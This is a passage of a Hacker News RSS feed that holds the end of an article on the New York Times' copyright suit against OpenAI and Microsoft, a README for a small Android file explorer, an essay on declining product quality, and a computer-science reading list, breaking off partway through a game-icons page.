<figure><img alt="Ask for a paragraph, and Copilot will hand you a wall of normally paywalled text." src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/Screen-Shot-2023-12-27-at-12.11.54-PM.png" width="934" height="799"><figcaption><p>Ask for a paragraph, and Copilot will hand you a wall of normally paywalled text.</p><p>John Timmer</p></figcaption></figure>
<p>But not all loopholes have been closed. The suit also shows output from Bing Chat, since rebranded as Copilot. We were able to verify that asking for the first paragraph of a specific article at The Times caused Copilot to reproduce the first third of the article.</p>                                            
                                                        
<p>The suit is dismissive of attempts to justify this as a form of fair use. "Publicly, Defendants insist that their conduct is protected as 'fair use' because their unlicensed use of copyrighted content to train GenAI models serves a new 'transformative' purpose," the suit notes. "But there is nothing 'transformative' about using The Times’s content without payment to create products that substitute for The Times and steal audiences away from it."</p>
<h2>Reputational and other damages</h2>
<p>The hallucinations common to AI also came under fire in the suit for potentially damaging the value of the Times' reputation, and possibly damaging human health as a side effect. "A GPT model completely fabricated that “The New York Times published an article on January 10, 2020, titled ‘Study Finds Possible Link between Orange Juice and Non-Hodgkin’s Lymphoma,’” the suit alleges. "The Times never published such an article."</p>
<p>Similarly, asking about a Times article on heart-healthy foods allegedly resulted in Copilot saying it contained a list of examples (which it didn't). When asked for the list, 80 percent of the foods on weren't even mentioned by the original article. In another case, recommendations were ascribed to the Wirecutter when the products hadn't even been reviewed by its staff.</p>
<p>As with the Times material, it's alleged that it's possible to get Copilot to offer up large chunks of Wirecutter articles (The Wirecutter is owned by The New York Times). But the suit notes that these article excerpts have the affiliate links stripped out of them, keeping the Wirecutter from its primary source of revenue.</p>
<p>The suit targets various OpenAI companies for developing the software, as well as Microsoft—the latter for both offering OpenAI-powered services, and for having developed the computing systems that enabled the copyrighted material to be ingested during training. Allegations include direct, contributory, and vicarious copyright infringement, as well as DMCA and trademark violations. Finally, it alleges "Common Law Unfair Competition By Misappropriation."</p>
<p>The suit seeks nothing less than the erasure of both any GPT instances that the parties have trained using material from the Times, as well as the destruction of the datasets that were used for the training. It also asks for a permanent injunction to prevent similar conduct in the future. The Times also wants money, lots and lots of money: "statutory damages, compensatory damages, restitution, disgorgement, and any other relief that may be permitted by law or equity."</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Little File Explorer – File Manager for Android 1.0 and above (106 pts)]]></title>
            <link>https://github.com/martinmimigames/little-file-explorer</link>
            <guid>38789958</guid>
            <pubDate>Thu, 28 Dec 2023 04:11:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/martinmimigames/little-file-explorer">https://github.com/martinmimigames/little-file-explorer</a>, See on <a href="https://news.ycombinator.com/item?id=38789958">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Little File Explorer</h2>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/martinmimigames/little-file-explorer/blob/main/docs/images/icon.png"><img src="https://github.com/martinmimigames/little-file-explorer/raw/main/docs/images/icon.png" alt="Icon"></a></p>
<p dir="auto"><a href="https://github.com/martinmimigames/little-file-explorer/blob/main/LICENSE.md"><img src="https://camo.githubusercontent.com/e7bb4e4d68df6fd055e495ae65d3a0fa1b7766c0b49e1e6b7cd638847a13924d/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6d617274696e6d696d6967616d65732f6c6974746c652d66696c652d6578706c6f7265723f7374796c653d666c61742d737175617265" alt="Read License" data-canonical-src="https://img.shields.io/github/license/martinmimigames/little-file-explorer?style=flat-square"></a></p>
<p dir="auto"><a href="https://www.codefactor.io/repository/github/martinmimigames/little-file-explorer" rel="nofollow"><img src="https://camo.githubusercontent.com/b1831516e31dabea2627d22b5afb1189e7cf37b31ab87ebbd75b5d5fa1db7956/68747470733a2f2f696d672e736869656c64732e696f2f636f6465666163746f722f67726164652f6769746875622f6d617274696e6d696d6967616d65732f6c6974746c652d66696c652d6578706c6f7265722f6d61696e3f7374796c653d666c61742d737175617265" alt="Code Quality" data-canonical-src="https://img.shields.io/codefactor/grade/github/martinmimigames/little-file-explorer/main?style=flat-square"></a></p>
<h2 tabindex="-1" dir="auto">Descriptions</h2>
<p dir="auto">A small, simple file explorer, designed with compatibility in mind.</p>
<p dir="auto">Open-sourced and publicly-viewable code for anyone worrying about being locked in or privacy invasion.</p>
<p dir="auto">It provides multiple functions, including copy and pasting files, multi-file share, etc. More information available in <strong>Features</strong> section below.</p>
<p dir="auto">Supports Android 1.0+</p>
<p dir="auto">Currently under 40 KB.</p>
<p dir="auto">Previous known as <em>Simple File Explorer</em> (but from martinmimigames).</p>
<p dir="auto">Location of website:
<a href="https://martinmimigames.github.io/projects/little-file-explorer/index.html" rel="nofollow">https://martinmimigames.github.io/projects/little-file-explorer</a>.</p>
<h2 tabindex="-1" dir="auto">Screenshots</h2>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/martinmimigames/little-file-explorer/blob/main/docs/images/example1.jpg"><img src="https://github.com/martinmimigames/little-file-explorer/raw/main/docs/images/example1.jpg" alt="Screenshot 1"></a></p>
<h2 tabindex="-1" dir="auto">Features</h2>
<ul dir="auto">
<li>Free</li>
<li>Small (&lt; 40 KB)</li>
<li>Basic file operations (Cut, copy, paste, rename, delete)</li>
<li>File name filter</li>
<li>Name and Modified Time sort</li>
<li>Easy switch between sdcard and internal storage</li>
<li>Multi-share function</li>
<li>File/folder path copying</li>
<li>Minimum permissions</li>
<li>Dark/light theme toggle</li>
<li>md5 checksum generation and verification</li>
</ul>
<h2 tabindex="-1" dir="auto">Latest Versions</h2>
<ul dir="auto">
<li>
<p dir="auto">v4.14</p>
<ul dir="auto">
<li>Fixed filter bug causing crash on startup</li>
<li>Fixed file not opening on some apps (missing metadata)</li>
<li>Fixed file size calculation incorrect</li>
<li>Now clear text input when create new folder</li>
<li>More natural-looking back button</li>
<li>Removed unused notification about invalid folder name</li>
<li>Now uses Future for concurrency management (less race condition)</li>
</ul>
</li>
<li>
<p dir="auto">v4.13</p>
<ul dir="auto">
<li>Fixed # in file name error</li>
<li>Added follow system dark mode</li>
<li>Fixed crash when open details of large files</li>
<li>Fixed error when empty clipboard</li>
<li>Now clear filter when entering/exiting folder</li>
<li>Added invalid name warning when creating/renaming files</li>
</ul>
</li>
<li>
<p dir="auto">v4.12</p>
<ul dir="auto">
<li>added md5 checksum calculation and verification (details page)</li>
<li>theme is now toggle-based (burger menu)</li>
<li>app now forget last path (feature reverted)</li>
</ul>
</li>
<li>
<p dir="auto">v4.11</p>
<ul dir="auto">
<li>Fix crashing if last exited on a non-existing folder</li>
<li>Fix unable to exit folders with access denied</li>
<li>Added details page for files</li>
<li>Added light mode (follows system settings)</li>
<li>Added sorting by file size</li>
<li>Moved storage info to the bottom</li>
<li>Added slight padding to dialogs</li>
</ul>
</li>
<li>
<p dir="auto">v4.10</p>
<ul dir="auto">
<li>Added "toggle hidden" option (available in menu button)</li>
<li>Added File/Folder name filtering (available on top bar)</li>
<li>Added display sorting (name, last modified time) (available in menu button)</li>
<li>Added file path remembering on app exit</li>
<li>Re-added share button in open list options</li>
<li>Fixed delete confirmation screen being full screen</li>
</ul>
</li>
<li>
<p dir="auto">v4.9</p>
<ul dir="auto">
<li>Fixed sticky selection state after leaving app</li>
<li>Fixed concurrent directory list modification</li>
<li>Removed share button from file option menu</li>
<li>Added duplicate folder warning when creating new folder</li>
<li>Changed rounding system for storage size display</li>
<li>Always update storage list quick switch display</li>
<li>Now use cache thread pool for reducing idle cpu usage and increase performance</li>
</ul>
</li>
<li>
<p dir="auto">v4.8</p>
<ul dir="auto">
<li>Allow folder path to be copied to clipboard</li>
<li>Fixed incorrect handling after path copying</li>
<li>Fixed delete conformation button being pushed out by long list</li>
<li>Fixed copying to incorrect directory when moved directory while in progress</li>
</ul>
</li>
<li>
<p dir="auto">v4.7</p>
<ul dir="auto">
<li>Added multi-share option (sdk 4+)</li>
<li>Added file path copy option</li>
<li>Allow open file with default apps</li>
<li>Reduced open list button size</li>
<li>Capitalised buttons</li>
<li>Changed opener text</li>
</ul>
</li>
<li>
<p dir="auto">v4.6</p>
<ul dir="auto">
<li>Fixed not opening when no sdcard inserted</li>
</ul>
</li>
<li>
<p dir="auto">v4.5</p>
<ul dir="auto">
<li>smaller apk</li>
<li>fixed quick selection overlap with menu list</li>
<li>opening file request by other app now have open prompt</li>
<li>changed audio png</li>
<li>back button now go back to parent folder if available</li>
</ul>
</li>
</ul>
<h2 tabindex="-1" dir="auto">Branches</h2>
<ul dir="auto">
<li>main: latest source-code</li>
</ul>
<h2 tabindex="-1" dir="auto">Issues</h2>
<p dir="auto">Issues and pull requests are always welcome!</p>
<p dir="auto">You can submit issues the following ways:</p>
<ul dir="auto">
<li>via <a href="https://github.com/martinmimigames/little-file-explorer/issues">Github Issues</a></li>
<li>via email: <a href="mailto:martinmimigames@gmail.com">martinmimigames@gmail.com</a></li>
</ul>
<h2 tabindex="-1" dir="auto">Installation</h2>
<p dir="auto"><a href="https://f-droid.org/packages/com.martinmimigames.simplefileexplorer/" rel="nofollow"><img src="https://camo.githubusercontent.com/6904720a6735bf9a5ff4296afbe06c9e4c0d2f55f88ffdabd6df340c87b2083d/68747470733a2f2f6d617274696e6d696d6967616d65732e6769746875622e696f2f7265732f6765742d69742d6f6e2f662d64726f69642e706e67" alt="Get it on F-Droid" height="80" data-canonical-src="https://martinmimigames.github.io/res/get-it-on/f-droid.png"></a></p>
<p dir="auto"><a href="https://github.com/martinmimigames/little-file-explorer/releases/latest"><img src="https://camo.githubusercontent.com/8d8788cbbd75d3ebaacf8084cfb1d5d29f5069434007a42b26a89bc9169b68a8/68747470733a2f2f6d617274696e6d696d6967616d65732e6769746875622e696f2f7265732f6765742d69742d6f6e2f6769746875622e706e67" alt="Get it on Github" height="80" data-canonical-src="https://martinmimigames.github.io/res/get-it-on/github.png"></a></p>
<p dir="auto"><a href="https://martinmimigames.github.io/projects/little-file-explorer" rel="nofollow">Get it from the official website</a></p>
<h2 tabindex="-1" dir="auto">Made by Martinmimigames</h2>
<p dir="auto">Official Website at <a href="https://martinmimigames.github.io/" rel="nofollow">https://martinmimigames.github.io</a></p>
<h3 tabindex="-1" dir="auto">Last update of README</h3>
<p dir="auto">Date : 28-11-2023 dd-mm-yyyy</p>
<h3 tabindex="-1" dir="auto">Important</h3>
<p dir="auto"><strong>Please read the license!</strong></p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Generation Junk (244 pts)]]></title>
            <link>https://walterkirn.substack.com/p/generation-junk</link>
            <guid>38789411</guid>
            <pubDate>Thu, 28 Dec 2023 02:44:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://walterkirn.substack.com/p/generation-junk">https://walterkirn.substack.com/p/generation-junk</a>, See on <a href="https://news.ycombinator.com/item?id=38789411">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg" width="221" height="228" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:228,&quot;width&quot;:221,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8853,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; About five years ago, for seven dollars, I bought an old citrus juicer at a thrift shop.&nbsp; It was one of those vintage small appliances which seem built to survive gas explosions and hammer attacks. When I turned on the motor with a metal toggle switch, a drive shaft spun a heavy ceramic knob that gouged out the hearts of lemon and orange halves, leaving not a scrap of pulp uncrushed. The thing worked beautifully, almost like new, so I looked up its serial number on the internet to see when the unit was manufactured, guessing it might be almost forty years old. Wrong. It dated to the 1940s. It was seventy, the stubborn monster, still giving satisfaction with every use.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I can’t say the same about my coffee grinders. I use the plural because I’ve owned a lot of them, all bought in their original packaging and dead within a year. They’re good ones, supposedly, with burrs not blades, but they stop performing before long, ending their long journeys from overseas factories in unmarked graves in my local Montana landfill. I have a whole ghost kitchen in this landfill, and soon I will need to reserve a bigger plot. For the nifty under-the-counter fridge that has stopped getting cold after three years and which no one in the area can fix. For the cool bagless vacuum cleaner that clogs and chokes when I run it over a rug. For the set of glass measuring cups whose numbers and hashmarks are swiftly fading and becoming illegible, much like those on the dials of the washer my wife bought just three years ago. For the remains of the Pyrex casserole that shattered when I removed it from the oven, strewing the floor with blade-like shards, some so tiny I probably won’t find them until they lodge in my bare feet.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Should I go on? I think I will. It’s important to get to the thoughtful, speculative part, where I ask what it means when the objects in our lives demoralize us in a blizzard of malfunctions, but it’s also important – to me, emotionally -- to bury the reader in details of the unceasing material disappointments I’ve faced &nbsp;&nbsp;The cute yellow mittens my wife picked up at Target which unraveled the second time she wore them. The new suitcase which won’t stand upright when it’s full. The laptop computers that have turned to bricks within months of their warranties expiring. And the hybrid sedan with fifty thousand miles on it that also turned into a brick while going eighty down the freeway, losing its power steering, its power brakes, its power everything. I survived, by some miracle, issued legal threats, and the car’s manufacturer repaired it, free. Then it bricked again a few weeks later.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It’s the little things too, of course, because they’re constant. The staples that won’t pierce five stacked sheets of paper. The matches that sizzle and smoke but don’t catch fire. The grocery bags split by the corners of the milk cartons whose inadequately seals leak drops of milk. The strangely short power cords on electronics. The two or three new pens I use each week that, because no ink comes out of them (at least not continually, in lines) aren’t really pens at all, in fact, but tributes to pens, Potemkin pens, mere props.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Baffled by how to measure this decline in the quality of common wares – a decline whose significance I promise to cover once I’ve further gratified my rage -- I opened the matter to my Twitter audience and quickly garnered two thousand replies, by far the longest thread I’ve ever triggered. The complaints were specific and formed patterns. One was a loathing for newer washers and dryers, because they don’t wash or dry well, and then they break. The clothes that go inside them were disliked too. (A former top executive of Levi’s chimed in to confirm that jeans aren’t what they used to be.) My favorite replies were the picky ones. One person noted that the “juice content” of juice is going down. Another observed that the “foaming liquid hand soap” which suddenly is dominating store shelves is just normal liquid soap, diluted.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Many blamed these problems on the government. They believed it had crippled certain products (major home appliances especially) with environmental regulations, causing them to function poorly and turn rapidly to landfill fodder -- an ecological net loss, perhaps. Some folks blamed our trade arrangements with China and the evils of capitalism itself. Weak-link computer chips in items that don’t require them also came in for abuse. One philosophical reply spoke of a sinister general trend toward the degradation of everything human. “There’s a war on value that’s going that’s comprised of three parts: war on quality, war on money, war on life.” Lofty rhetoric, but I understood. When my suddenly de-electrified hybrid car became a hurtling giant stone inside which my wife and I were helplessly strapped – all for the crime of trying to save fuel and, ultimately, earth-- it was hard not to feel ambushed, tricked.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Only a couple of my correspondents challenged my premise – and the flood of testimony -- that stuff is getting crappier, acutely so. They made an economic argument. They claimed things are worse because we want them cheaper, but if price is adjusted for inflation, they’re of the same quality as always. These rant-killing sophisticates annoyed me. Our new washing machine with the faded dials and the vanishing enamel on its corners (I forgot to mention that defect) is the costliest model we’ve ever purchased. As for the much of the cheap stuff – those Target mittens, say – they aren’t merely inexpensive, they’re valueless. In fact, they’re of negative value when one considers the waste or materials involved, and the wasted energy of driving to buy them, then driving to return them later – a second trip that in this case, and many others, wasn’t worth making. Instead, we took the loss. And the world took the loss. A small one, but they add up.</p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In England in the 19</span><sup>th</sup><span> Century there arose certain thinkers – John Ruskin, William Morris – who believed that the quality of material objects reflects and affects the quality of society, even of the spirit. “Have nothing in your home,” wrote Morris, the father of the Arts and Crafts movement, which aimed to elevate the lives of the working and middle classes, “that you do not know to be useful or believe to be beautiful.” This would be a tall order nowadays. Recently, my wife needed a carrot peeler. She needed one rather quickly. Off to Target. The one she bought (the only one on sale) looked handsome enough, and the brand was one she recognized, but it failed in the useful department, miserably. It wasn’t sharp enough to peel a carrot. Like my pens which aren’t pens because pens put ink on paper, her peeler which didn’t peel was a nullity, a simulacrum, a representation of something, not the thing.</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The world is going digital, we’re told, and someday there will even be digital real estate inhabited by people in digital clothes drinking digital orange juice extracted with digital juicers. &nbsp;People will play at the lives they once took seriously, lives that had once had heft and weight, and the juice content of juice will fall to zero. I suspect my old physical squeezer will still be working then, but the rest of my kitchen gear won’t. Not much of it. I might not last, either. I fear I won’t. The psychic toll of goods that don’t endure is that one loses faith that future will even come, and then one loses interest in it coming, for little that we own or use or cherish seems likely to be there with us to meet it.</p><p>             One wonders whose obsolescence is being planned, our products’ or our own?</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Book list for streetfighting computer scientists (2022) (108 pts)]]></title>
            <link>https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists</link>
            <guid>38789332</guid>
            <pubDate>Thu, 28 Dec 2023 02:33:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists">https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists</a>, See on <a href="https://news.ycombinator.com/item?id=38789332">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="mw-content" role="main"><p>From dankwiki</p><div id="bodyContent" lang="en" dir="ltr"><figure typeof="mw:File/Thumb"><a href="https://nick-black.com/dankwiki/index.php/File:Dijkstra.jpg"><img src="https://nick-black.com/dankwiki/images/thumb/a/ad/Dijkstra.jpg/300px-Dijkstra.jpg" decoding="async" width="300" height="343" srcset="https://nick-black.com/dankwiki/images/a/ad/Dijkstra.jpg 1.5x"></a><figcaption>Edsger Dijkstra is watching you</figcaption></figure>
<p>2022 edition. this is very different from most "best books for programmers" lists you'll see, with <i>Code Complete</i> and <i>Clean Code</i> and <i>Wistful Wanking for Practical Wankers</i> and <i>Design Slatterns</i> and titles like that. you'll figure all that out as you go along. these are books to read so that you can cut motherfuckers with knives. do you need to read all of these? only if you want to know the things inside, i guess.
</p>
<ul><li>Dijkstra, A Discipline of Programming</li>
<li>Knuth, The Art of Computer Programming, especially volumes 1 and 4B</li>
<li>Warren, Hacker's Delight</li>
<li>Stevens, Advanced Programming in the UNIX Environment</li>
<li>Stevens, UNIX Network Programming</li>
<li>Abelson + Sussman, Structure and Interpretation of Computer Programs</li>
<li>Varghese, Networking Algorithmics</li>
<li>McKusick, The Design and Implementation of the FreeBSD Operating System</li>
<li>Kerrisk, The Linux Programming Interface</li>
<li>Stroustrup, The C++ Programming Language</li>
<li>Gustedt, Modern C</li>
<li>Hanson, C Interfaces and Implementations</li>
<li>Garcia + Widjaja, Communications Networks</li>
<li>Kleinrock, Queueing Systems, especially volume 1</li>
<li>Hennessy + Paterson, Computer Architecture: A Quantitative Approach</li>
<li>Kennedy, Optimizing Compilers for Modern Architectures</li>
<li>Stepanov, From Mathematics to Generic Programming</li>
<li>CLRS, Introduction to Algorithms</li>
<li>Samet, Metric and Multidimensional Data Structures</li>
<li>McKenney, Is Parallel Programming Hard, And, If So, What Can You Do About It</li>
<li>Crochemere et al, Algorithms on Strings</li>
<li>Culler et al, Parallel Computer Architecture</li>
<li>Ward + Halstead, Computation Structures</li>
<li>Shriver + Smith, The Anatomy of a High-Performance Microprocessor</li>
<li>Vazirani, Approximation Algorithms</li>
<li>Raghaven + Motwani, Randomized Algorithms</li>
<li>Sipser, Introduction to the Theory of Computation</li>
<li>Ahora + Barak, Computational Complexity</li>
<li>Pierce, Types and Programming Languages</li>
<li>Barendregt, The Lambda Calculus</li>
<li>Okasaki, Purely Functional Data Structures</li>
<li>Van Roy + Hardidi, Concepts, Techniques, and Models of Computer Programming</li>
<li>Galub + Van Loan, Matrix Computations (note that this last is pretty much a straight mathematics textbook, but roaming multiethnic gangs of matrices make up many streetfights)</li></ul>
<p>speaking of math, you might want to take a look at Axler's <i>Linear Algebra Done Right</i> and Knuth's <i>Concrete Mathematics</i>. you'll want to know your combinatorics, your prob/stats, and your linear algebra cold. calculus through diffeqs is necessary to know, but i'm a pretty hardcore nerd and yet don't find myself integrating things all that often.
</p><p>now go forth and <a rel="nofollow" href="https://www.youtube.com/watch?v=BUt0dZXPFoU">fight in the streets</a>. i list no machine learning because i dislike machine learning. there are no quantum books because quantum is not yet useful for streetfighting (we all look forward to this situation changing). i list no SIMT/accelerator books because they're all shite. i list no infosec because infosec is a subfield of QA, fight me. there are no links because i'm a lazy, lazy man.
</p><p>i've heard good things about Tim Roughgarden's algorithms books, and have them on my shelves to read soon, but cannot yet speak to them.
</p><p>you should of course also read <a rel="nofollow" href="https://www.amazon.com/Hacking-Planet-Notcurses-Character-Graphics/dp/B086PNVNC9">Hacking the Planet with Notcurses</a>, buying copies for your team and family.
</p>
<!-- 
NewPP limit report
Cached time: 20231228063244
Cache expiry: 86400
Reduced expiry: false
Complications: [no‐toc‐conversion]
CPU time usage: 0.007 seconds
Real time usage: 0.007 seconds
Preprocessor visited node count: 1/1000000
Post‐expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 1/100
Expensive parser function count: 0/100
Unstrip recursion depth: 0/20
Unstrip post‐expand size: 0/5000000 bytes
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%    0.000      1 -total
-->

<!-- Saved in parser cache with key wikidb:pcache:idhash:1434-0!canonical and timestamp 20231228063247 and revision id 10434. Rendering was triggered because: edit-page
 -->
</div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Game-icons.net: Free icons for your games (213 pts)]]></title>
            <link>https://game-icons.net/</link>
            <guid>38788552</guid>
            <pubDate>Thu, 28 Dec 2023 00:28:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://game-icons.net/">https://game-icons.net/</a>, See on <a href="https://news.ycombinator.com/item?id=38788552">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><main><h2><a href="https://game-icons.net/feeds/icons.xml"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/rss.svg" alt="rss icon" width="24" height="24"></a> Last Update Dec 20, 2022 | <a href="https://game-icons.net/recent.html">Recent icons</a></h2><h2>Popular ones with random colors</h2><ul><li data-hint="Robber"><p><a href="https://game-icons.net/1x1/delapouite/robber.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/robber.svg" alt="Robber icon" width="120" height="120"></a></p></li><li data-hint="Triton head"><p><a href="https://game-icons.net/1x1/lorc/triton-head.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/triton-head.svg" alt="Triton head icon" width="120" height="120"></a></p></li><li data-hint="Shark bite"><p><a href="https://game-icons.net/1x1/delapouite/shark-bite.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/shark-bite.svg" alt="Shark bite icon" width="120" height="120"></a></p></li><li data-hint="Glass heart"><p><a href="https://game-icons.net/1x1/lorc/glass-heart.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/glass-heart.svg" alt="Glass heart icon" width="120" height="120"></a></p></li><li data-hint="Drop weapon"><p><a href="https://game-icons.net/1x1/skoll/drop-weapon.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/skoll/drop-weapon.svg" alt="Drop weapon icon" width="120" height="120"></a></p></li><li data-hint="Winged sword"><p><a href="https://game-icons.net/1x1/lorc/winged-sword.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/winged-sword.svg" alt="Winged sword icon" width="120" height="120"></a></p></li><li data-hint="Ship's wheel"><p><a href="https://game-icons.net/1x1/delapouite/ship-wheel.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/ship-wheel.svg" alt="Ship's wheel icon" width="120" height="120"></a></p></li><li data-hint="Fishing"><p><a href="https://game-icons.net/1x1/delapouite/fishing.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/fishing.svg" alt="Fishing icon" width="120" height="120"></a></p></li><li data-hint="Angler fish"><p><a href="https://game-icons.net/1x1/lorc/angler-fish.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/angler-fish.svg" alt="Angler fish icon" width="120" height="120"></a></p></li><li data-hint="Bowling Strike"><p><a href="https://game-icons.net/1x1/delapouite/bowling-strike.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/bowling-strike.svg" alt="Bowling Strike icon" width="120" height="120"></a></p></li><li data-hint="Vine leaf"><p><a href="https://game-icons.net/1x1/lorc/vine-leaf.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/vine-leaf.svg" alt="Vine leaf icon" width="120" height="120"></a></p></li><li data-hint="Missile swarm"><p><a href="https://game-icons.net/1x1/lorc/missile-swarm.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/missile-swarm.svg" alt="Missile swarm icon" width="120" height="120"></a></p></li><li data-hint="Andromeda chain"><p><a href="https://game-icons.net/1x1/lorc/andromeda-chain.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/andromeda-chain.svg" alt="Andromeda chain icon" width="120" height="120"></a></p></li><li data-hint="Sword clash"><p><a href="https://game-icons.net/1x1/lorc/sword-clash.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/sword-clash.svg" alt="Sword clash icon" width="120" height="120"></a></p></li><li data-hint="Dungeon light"><p><a href="https://game-icons.net/1x1/delapouite/dungeon-light.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/dungeon-light.svg" alt="Dungeon light icon" width="120" height="120"></a></p></li><li data-hint="Cyborg face"><p><a href="https://game-icons.net/1x1/delapouite/cyborg-face.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/cyborg-face.svg" alt="Cyborg face icon" width="120" height="120"></a></p></li><li data-hint="Fangs"><p><a href="https://game-icons.net/1x1/skoll/fangs.html"><img 